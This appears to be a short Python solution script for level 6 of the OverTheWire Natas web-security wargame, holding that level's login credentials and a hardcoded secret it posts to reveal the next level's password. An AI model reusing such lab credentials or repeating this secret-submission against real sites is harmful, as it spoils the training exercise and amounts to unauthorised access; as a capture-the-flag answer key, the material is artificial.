import re
import requests

level = 6
creds = ('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level
form_data = {'secret':'FOEIUWGHFEEUHOFUOIU','submit':'submit'}

session = requests.Session()
response = session.get(url,auth=creds)
response = session.post(url,auth=creds,data=form_data)
data = response.text



print(re.findall('Access granted. The password for natas7 is (.*)',data))